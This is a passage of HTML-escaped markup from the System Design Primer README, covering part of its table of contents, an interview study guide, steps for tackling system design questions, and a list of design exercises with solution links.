&lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#relational-database-management-system-rdbms&#34;&gt;Relational database management system (RDBMS)&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#master-slave-replication&#34;&gt;Master-slave replication&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#master-master-replication&#34;&gt;Master-master replication&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#federation&#34;&gt;Federation&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#sharding&#34;&gt;Sharding&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#denormalization&#34;&gt;Denormalization&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#sql-tuning&#34;&gt;SQL tuning&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#nosql&#34;&gt;NoSQL&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#key-value-store&#34;&gt;Key-value store&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#document-store&#34;&gt;Document store&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#wide-column-store&#34;&gt;Wide column store&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#graph-database&#34;&gt;Graph Database&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#sql-or-nosql&#34;&gt;SQL or NoSQL&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#cache&#34;&gt;Cache&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#client-caching&#34;&gt;Client caching&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#cdn-caching&#34;&gt;CDN caching&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#web-server-caching&#34;&gt;Web server caching&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#database-caching&#34;&gt;Database caching&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#application-caching&#34;&gt;Application caching&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#caching-at-the-database-query-level&#34;&gt;Caching at the database query level&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#caching-at-the-object-level&#34;&gt;Caching at the object level&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#when-to-update-the-cache&#34;&gt;When to update the cache&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#cache-aside&#34;&gt;Cache-aside&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#write-through&#34;&gt;Write-through&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#write-behind-write-back&#34;&gt;Write-behind (write-back)&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#refresh-ahead&#34;&gt;Refresh-ahead&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#asynchronism&#34;&gt;Asynchronism&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#message-queues&#34;&gt;Message queues&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#task-queues&#34;&gt;Task queues&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#back-pressure&#34;&gt;Back pressure&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#communication&#34;&gt;Communication&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#transmission-control-protocol-tcp&#34;&gt;Transmission control protocol (TCP)&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#user-datagram-protocol-udp&#34;&gt;User datagram protocol (UDP)&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#remote-procedure-call-rpc&#34;&gt;Remote procedure call (RPC)&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#representational-state-transfer-rest&#34;&gt;Representational state transfer (REST)&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#security&#34;&gt;Security&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#appendix&#34;&gt;Appendix&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#powers-of-two-table&#34;&gt;Powers of two table&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#latency-numbers-every-programmer-should-know&#34;&gt;Latency numbers every programmer should know&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#additional-system-design-interview-questions&#34;&gt;Additional system design interview questions&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#real-world-architectures&#34;&gt;Real world architectures&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#company-architectures&#34;&gt;Company architectures&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#company-engineering-blogs&#34;&gt;Company engineering blogs&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#under-development&#34;&gt;Under development&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#credits&#34;&gt;Credits&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#contact-info&#34;&gt;Contact info&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Study guide&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Suggested topics to review based on your interview timeline (short, medium, long).&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/OfVllex.png&#34; alt=&#34;Imgur&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Q: For interviews, do I need to know everything here?&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;A: No, you don&#39;t need to know everything here to prepare for the interview&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;What you are asked in an interview depends on variables such as:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;How much experience you have&lt;/li&gt; &#xA; &lt;li&gt;What your technical background is&lt;/li&gt; &#xA; &lt;li&gt;What positions you are interviewing for&lt;/li&gt; &#xA; &lt;li&gt;Which companies you are interviewing with&lt;/li&gt; &#xA; &lt;li&gt;Luck&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;More experienced candidates are generally expected to know more about system design. Architects or team leads might be expected to know more than individual contributors. Top tech companies are likely to have one or more design interview rounds.&lt;/p&gt; &#xA;&lt;p&gt;Start broad and go deeper in a few areas. It helps to know a little about various key system design topics. Adjust the following guide based on your timeline, experience, what positions you are interviewing for, and which companies you are interviewing with.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Short timeline&lt;/strong&gt; - Aim for &lt;strong&gt;breadth&lt;/strong&gt; with system design topics. Practice by solving &lt;strong&gt;some&lt;/strong&gt; interview questions.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Medium timeline&lt;/strong&gt; - Aim for &lt;strong&gt;breadth&lt;/strong&gt; and &lt;strong&gt;some depth&lt;/strong&gt; with system design topics. Practice by solving &lt;strong&gt;many&lt;/strong&gt; interview questions.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Long timeline&lt;/strong&gt; - Aim for &lt;strong&gt;breadth&lt;/strong&gt; and &lt;strong&gt;more depth&lt;/strong&gt; with system design topics. Practice by solving &lt;strong&gt;most&lt;/strong&gt; interview questions.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;Short&lt;/th&gt; &#xA;   &lt;th&gt;Medium&lt;/th&gt; &#xA;   &lt;th&gt;Long&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Read through the &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#index-of-system-design-topics&#34;&gt;System design topics&lt;/a&gt; to get a broad understanding of how systems work&lt;/td&gt; &#xA;   &lt;td&gt;&lt;span&gt;👍&lt;/span&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;span&gt;👍&lt;/span&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;span&gt;👍&lt;/span&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Read through a few articles in the &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#company-engineering-blogs&#34;&gt;Company engineering blogs&lt;/a&gt; for the companies you are interviewing with&lt;/td&gt; &#xA;   &lt;td&gt;&lt;span&gt;👍&lt;/span&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;span&gt;👍&lt;/span&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;span&gt;👍&lt;/span&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Read through a few &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#real-world-architectures&#34;&gt;Real world architectures&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;span&gt;👍&lt;/span&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;span&gt;👍&lt;/span&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;span&gt;👍&lt;/span&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Review &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#how-to-approach-a-system-design-interview-question&#34;&gt;How to approach a system design interview question&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;span&gt;👍&lt;/span&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;span&gt;👍&lt;/span&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;span&gt;👍&lt;/span&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Work through &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#system-design-interview-questions-with-solutions&#34;&gt;System design interview questions with solutions&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Some&lt;/td&gt; &#xA;   &lt;td&gt;Many&lt;/td&gt; &#xA;   &lt;td&gt;Most&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Work through &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#object-oriented-design-interview-questions-with-solutions&#34;&gt;Object-oriented design interview questions with solutions&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Some&lt;/td&gt; &#xA;   &lt;td&gt;Many&lt;/td&gt; &#xA;   &lt;td&gt;Most&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Review &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#additional-system-design-interview-questions&#34;&gt;Additional system design interview questions&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Some&lt;/td&gt; &#xA;   &lt;td&gt;Many&lt;/td&gt; &#xA;   &lt;td&gt;Most&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;How to approach a system design interview question&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;How to tackle a system design interview question.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;The system design interview is an &lt;strong&gt;open-ended conversation&lt;/strong&gt;. You are expected to lead it.&lt;/p&gt; &#xA;&lt;p&gt;You can use the following steps to guide the discussion. To help solidify this process, work through the &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#system-design-interview-questions-with-solutions&#34;&gt;System design interview questions with solutions&lt;/a&gt; section using the following steps.&lt;/p&gt; &#xA;&lt;h3&gt;Step 1: Outline use cases, constraints, and assumptions&lt;/h3&gt; &#xA;&lt;p&gt;Gather requirements and scope the problem. Ask questions to clarify use cases and constraints. Discuss assumptions.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Who is going to use it?&lt;/li&gt; &#xA; &lt;li&gt;How are they going to use it?&lt;/li&gt; &#xA; &lt;li&gt;How many users are there?&lt;/li&gt; &#xA; &lt;li&gt;What does the system do?&lt;/li&gt; &#xA; &lt;li&gt;What are the inputs and outputs of the system?&lt;/li&gt; &#xA; &lt;li&gt;How much data do we expect to handle?&lt;/li&gt; &#xA; &lt;li&gt;How many requests per second do we expect?&lt;/li&gt; &#xA; &lt;li&gt;What is the expected read to write ratio?&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Step 2: Create a high level design&lt;/h3&gt; &#xA;&lt;p&gt;Outline a high level design with all important components.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Sketch the main components and connections&lt;/li&gt; &#xA; &lt;li&gt;Justify your ideas&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Step 3: Design core components&lt;/h3&gt; &#xA;&lt;p&gt;Dive into details for each core component. For example, if you were asked to &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/pastebin/README.md&#34;&gt;design a url shortening service&lt;/a&gt;, discuss:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Generating and storing a hash of the full url &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/pastebin/README.md&#34;&gt;MD5&lt;/a&gt; and &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/pastebin/README.md&#34;&gt;Base62&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Hash collisions&lt;/li&gt; &#xA;   &lt;li&gt;SQL or NoSQL&lt;/li&gt; &#xA;   &lt;li&gt;Database schema&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Translating a hashed url to the full url &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Database lookup&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;API and object-oriented design&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Step 4: Scale the design&lt;/h3&gt; &#xA;&lt;p&gt;Identify and address bottlenecks, given the constraints. For example, do you need the following to address scalability issues?&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Load balancer&lt;/li&gt; &#xA; &lt;li&gt;Horizontal scaling&lt;/li&gt; &#xA; &lt;li&gt;Caching&lt;/li&gt; &#xA; &lt;li&gt;Database sharding&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Discuss potential solutions and trade-offs. Everything is a trade-off. Address bottlenecks using &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#index-of-system-design-topics&#34;&gt;principles of scalable system design&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Back-of-the-envelope calculations&lt;/h3&gt; &#xA;&lt;p&gt;You might be asked to do some estimates by hand. Refer to the &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#appendix&#34;&gt;Appendix&lt;/a&gt; for the following resources:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://highscalability.com/blog/2011/1/26/google-pro-tip-use-back-of-the-envelope-calculations-to-choo.html&#34;&gt;Use back of the envelope calculations&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#powers-of-two-table&#34;&gt;Powers of two table&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#latency-numbers-every-programmer-should-know&#34;&gt;Latency numbers every programmer should know&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;p&gt;Check out the following links to get a better idea of what to expect:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.palantir.com/2011/10/how-to-rock-a-systems-design-interview/&#34;&gt;How to ace a systems design interview&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.hiredintech.com/system-design&#34;&gt;The system design interview&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=ZgdS0EUmn70&#34;&gt;Intro to Architecture and Systems Design Interviews&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://leetcode.com/discuss/career/229177/My-System-Design-Template&#34;&gt;System design template&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;System design interview questions with solutions&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Common system design interview questions with sample discussions, code, and diagrams.&lt;/p&gt; &#xA; &lt;p&gt;Solutions linked to content in the &lt;code&gt;solutions/&lt;/code&gt; folder.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Question&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design Pastebin.com (or Bit.ly)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/pastebin/README.md&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design the Twitter timeline and search (or Facebook feed and search)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/twitter/README.md&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a web crawler&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/web_crawler/README.md&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design Mint.com&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/mint/README.md&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design the data structures for a social network&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/social_graph/README.md&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a key-value store for a search engine&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/query_cache/README.md&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design Amazon&#39;s sales ranking by category feature&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/sales_rank/README.md&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a system that scales to millions of users on AWS&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/scaling_aws/README.md&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Add a system design question&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#contributing&#34;&gt;Contribute&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Design Pastebin.com (or Bit.ly)&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/pastebin/README.md&#34;&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/4edXG0T.png&#34; alt=&#34;Imgur&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Design the Twitter timeline and search (or Facebook feed and search)&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/twitter/README.md&#34;&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/jrUBAF7.png&#34; alt=&#34;Imgur&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Design a web crawler&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/web_crawler/README.md&#34;&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/bWxPtQA.png&#34; alt=&#34;Imgur&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Design Mint.com&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/mint/README.md&#34;&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/V5q57vU.png&#34; alt=&#34;Imgur&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Design the data structures for a social network&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/social_graph/README.md&#34;&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/cdCv5g7.png&#34; alt=&#34;Imgur&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Design a key-value store for a search engine&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/query_cache/README.md&#34;&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/4j99mhe.png&#34; alt=&#34;Imgur&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Design Amazon&#39;s sales ranking by category feature&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/sales_rank/README.md&#34;&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/MzExP06.png&#34; alt=&#34;Imgur&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Design a system that scales to millions of users on AWS&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/system_design/scaling_aws/README.md&#34;&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/jj3A5N8.png&#34; alt=&#34;Imgur&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Object-oriented design interview questions with solutions&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Common object-oriented design interview questions with sample discussions, code, and diagrams.&lt;/p&gt; &#xA; &lt;p&gt;Solutions linked to content in the &lt;code&gt;solutions/&lt;/code&gt; folder.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; 